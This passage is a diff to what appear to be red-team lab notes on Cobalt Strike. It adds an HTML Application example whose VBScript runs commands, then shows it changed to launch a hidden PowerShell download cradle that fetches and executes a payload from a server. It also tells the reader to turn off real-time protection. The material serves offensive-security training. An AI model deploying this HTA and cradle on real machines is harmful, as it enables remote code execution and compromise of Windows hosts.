@@ -140,6 +140,10 @@ Right-click on the X in the tab for additional options.
 
 # HTML Application (HTA)
 
+An HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer
+(VBScript and JScript). The HTML is used to generate the user interface and the scripting language for the program logic. An HTA executes without
+the constraints of the browser's security model, so it executes as a "fully trusted" application.
+
 Attacks > Web Drive-by > Scripted Web Delivery (S)
 URI Path: /a
 Local Host: same IP as your server
@@ -155,6 +159,34 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 Open a Command Prompt on your Windows VM and run the download cradle.
 
 Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
+
+- Example 2
+Create a new file text file on a Windows VM called test.hta and paste in the following:
+<html>
+  <head>
+    <title>Hello World</title>
+  </head>
+  <body>
+    <h2>Hello World</h2>
+    <p>This is an an HTA example.</p>
+  </body>
+
+  <script language="VBScript">
+    Function Pwn()
+      Set shell = CreateObject("wscript.Shell")
+      shell.run "calc"
+    End Function
+
+    Pwn
+  </script>
+</html>
+
+Make sure real-time protection is turned off.
+Open a Command Promtp: rename test.hta.txt test.hta
+Execute the file to see the document and calc open.
+Now replace the "calc" with the download cradle from above and force mshta to use the 64-bit version of PowerShell.
+
+shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.5/a'))"""
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 - Clean up
